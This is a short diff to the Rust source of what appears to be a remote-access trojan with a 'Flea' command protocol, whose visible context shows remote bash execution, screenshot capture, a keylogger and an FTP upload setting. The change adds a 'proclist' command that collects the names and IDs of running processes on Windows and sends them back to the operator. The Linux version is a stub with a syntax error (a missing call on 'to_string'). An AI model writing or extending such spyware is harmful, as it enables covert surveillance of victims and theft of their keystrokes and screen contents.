@@ -12,6 +12,7 @@ use scrap::{Capturer, Display};
 use std::time::Duration;
 use log::{debug, error};
 use chrono::{DateTime, Utc};
+use process_list::for_each_process;
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
@@ -19,6 +20,7 @@ const GET_VERSION_COMMAND: &'static str = "version";
 const EXECUTE_BASH_COMMAND: &'static str = "bash";
 const SEND_PIC_COMMAND: &'static str = "pic";
 const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
+const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
 //Enter your data for FTP Server connection
@@ -92,6 +94,34 @@ impl CommandProcessor
         };
         
         String::from_utf8(output.stdout).unwrap()
+    }
+
+    /// Gets processes list
+    /// * returns String with id and name of the processes list or empty on error
+    #[cfg(target_os = "windows")]
+    fn get_process_list(&self) -> String
+    {
+        let mut ret = "".to_string();
+
+        match for_each_process(|id, name| {
+            ret += format!("{} - {}\n", id, name.to_str().unwrap().to_string()).as_str();
+        })
+        {
+            Ok(_) =>
+            {
+            },
+            Err(_) =>
+            {
+            }
+        };
+
+        ret
+    }
+
+    #[cfg(target_os = "linux")]
+    fn get_process_list(&self) -> String
+    {
+        "".to_string
     }
 
     /// Takes screenshot and save it as a PNG file in a passed file
@@ -307,6 +337,11 @@ impl FleaCommand for CommandProcessor
             {
                 let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
                 return get_key_logger_content(&current_path);
+            },
+
+            SEND_PROCESS_LIST_COMMAND =>
+            {
+                return self.get_process_list();
             },
 
             SEND_PIC_COMMAND =>
